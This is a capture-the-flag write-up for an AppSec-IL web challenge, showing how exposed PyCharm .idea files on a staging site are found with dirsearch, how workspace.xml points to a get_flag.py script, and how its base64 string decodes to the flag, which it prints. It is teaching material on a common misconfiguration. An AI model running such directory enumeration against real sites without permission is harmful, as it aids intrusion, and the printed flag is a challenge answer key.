
# Centeral

* Category: Web
* 100 points

## Description

> Our DevOps change how thier IDE to deploy new Python projects. It should be safe now. 
> 
> is it?

## Solution

A website was attached. It said:

```html
<div class="container">
  <div class="card border-0 shadow my-5">
    <div class="card-body p-5">
      <h1 class="fw-light">STAGING ENVIROMENT. <br/>FOR DEVLOPMENT PURPOSES ONLY.</h1>
      <p class="lead">If you need a license for you PyCharm IDE please contact IT.</p>
    </div>
  </div>
</div>
```

The administrators might have uploaded some IDE metadata files together with the website files. 
We can check form them manually, but `dirsearch` is able to do the work for us:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/Centeral]
└─$ dirsearch -u https://centeral.appsecil.ctf.today/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /media/sf_CTFs/appsec/Centeral/reports/https_centeral.appsecil.ctf.today/__23-05-17_09-47-47.txt

Target: https://centeral.appsecil.ctf.today/

[09:47:47] Starting:
[09:47:56] 403 -  292B  - /.ht_wsr.txt
[09:47:56] 403 -  292B  - /.htaccess.bak1
[09:47:56] 403 -  292B  - /.htaccess.sample
[09:47:56] 403 -  292B  - /.htaccess.orig
[09:47:56] 403 -  292B  - /.htaccess_orig
[09:47:56] 403 -  292B  - /.htaccessOLD
[09:47:56] 403 -  292B  - /.htaccess_extra
[09:47:56] 403 -  292B  - /.htaccessOLD2
[09:47:56] 403 -  292B  - /.html
[09:47:56] 403 -  292B  - /.htm
[09:47:56] 403 -  292B  - /.htpasswd_test
[09:47:56] 403 -  292B  - /.htpasswds
[09:47:56] 403 -  292B  - /.htaccessBAK
[09:47:56] 403 -  292B  - /.htaccess_sc
[09:47:56] 403 -  292B  - /.htaccess.save
[09:47:56] 301 -  342B  - /.idea  ->  http://centeral.appsecil.ctf.today/.idea/
[09:47:56] 403 -  292B  - /.httr-oauth
[09:47:56] 403 -  292B  - /.idea/
[09:47:56] 200 -  186B  - /.idea/modules.xml
[09:47:56] 200 -  149B  - /.idea/misc.xml
[09:47:56] 200 -  159B  - /.idea/vcs.xml
[09:47:56] 200 -    2KB - /.idea/workspace.xml
[09:48:02] 200 -   30B  - /admin.py
[09:48:34] 403 -  292B  - /server-status/
[09:48:34] 403 -  292B  - /server-status
```

Browsing through the files, we find something interesting in `workspace.xml`:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/Centeral]
└─$ curl -s https://centeral.appsecil.ctf.today/.idea/workspace.xml | grep -i flag
      <option name="SCRIPT_NAME" value="$PROJECT_DIR$/get_flag.py" />
```

Let's read it:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/Centeral]
└─$ curl -s https://centeral.appsecil.ctf.today/get_flag.py
# Importing module
import base64

EncodedPwd = "QXBwU2VjLUlMe0QwX04wN19UcjdzdF9CbGlubGl5X0lEM30="

print(base64.b64decode(EncodedPwd))
```

We decode the string to get the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/appsec/Centeral]
└─$ echo QXBwU2VjLUlMe0QwX04wN19UcjdzdF9CbGlubGl5X0lEM30= | base64 -d
AppSec-IL{D0_N07_Tr7st_Blinliy_ID3}
```
